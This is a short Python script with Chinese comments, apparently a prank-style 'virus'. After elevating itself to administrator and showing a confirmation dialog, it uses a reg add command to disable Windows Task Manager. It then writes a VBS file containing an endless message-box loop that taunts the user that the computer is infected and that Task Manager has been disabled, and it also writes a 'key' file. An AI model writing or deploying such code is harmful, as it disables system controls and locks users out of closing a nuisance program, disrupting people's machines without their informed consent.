# coding=utf-8
# 上一行为指定文件编码方式
import ctypes, sys, os, easygui # 引入库


def is_admin() -> bool or int: # 定义函数，判断当前是否是以管理员权限运行该文件
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def admin_exe() -> None:
    if is_admin(): # 如果现在是以管理员权限执行文件
        user_choice = easygui.boolbox(title='请选择',msg='是否确定运行程序？',choices=['是','否']) # 向用户确认是否要执行文件
        if user_choice: # 如果用户确认要执行
            os.system("reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v DisableTaskMgr /t REG_DWORD /d 1") # 通过cmd将任务管理器禁用
            with open(file='./loop_window.vbs',mode='w',encoding='GBK') as f:
                f.write('do\nmsgbox"你的电脑这次真中病毒了，赶紧找cb帮你关吧，你关不掉,任务管理器已经被我禁用了~"\nloop') # 写入循环窗体的代码
            with open(file='key.txt',mode='w',encoding='UTF-8') as f: # 写入验证密钥
                f.write('cbw377368460109174097490147984681aig&%6786ihf4817490656789687466&%&hiu29375h8792659/sh_gf8t9%%6899836029-18=1')
        else: # 如果用户后悔，不想执行
            exit() # 退出程序
    else: # 如果现在不是以管理员权限执行文件
        if sys.version_info[0] == 3: # 如果当前python版本是3.x（如果低于3.0会报错）
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) # 申请以管理员权限重新执行该文件


if __name__ == '__main__': # 如果这个文件不是被作为一个库来导入
    admin_exe() # 那么就执行主程序
